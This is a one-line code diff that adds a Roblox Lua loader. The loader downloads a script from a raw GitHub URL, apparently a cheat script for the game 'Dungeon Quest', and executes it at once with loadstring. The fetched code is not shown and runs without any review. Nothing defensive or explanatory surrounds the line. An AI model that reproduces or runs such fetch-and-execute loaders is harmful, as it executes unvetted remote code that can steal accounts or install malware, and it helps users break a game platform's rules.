@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tropojaniexe-hub/dungequestLEDZ/refs/heads/main/indistiputedmade"))()
